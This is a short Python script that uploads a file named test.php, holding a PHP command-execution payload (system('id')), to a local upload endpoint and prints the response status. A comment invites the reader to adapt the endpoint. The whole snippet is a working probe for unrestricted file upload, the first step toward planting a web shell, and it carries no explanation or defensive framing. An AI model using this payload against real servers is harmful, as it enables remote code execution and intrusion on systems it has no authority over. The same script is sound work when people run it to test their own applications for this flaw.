import requests
files = {'file': ('test.php', b'<?php system("id"); ?>')}
r = requests.post("http://127.0.0.1:5000/upload", files=files)  # adapt endpoint
print(r.status_code)
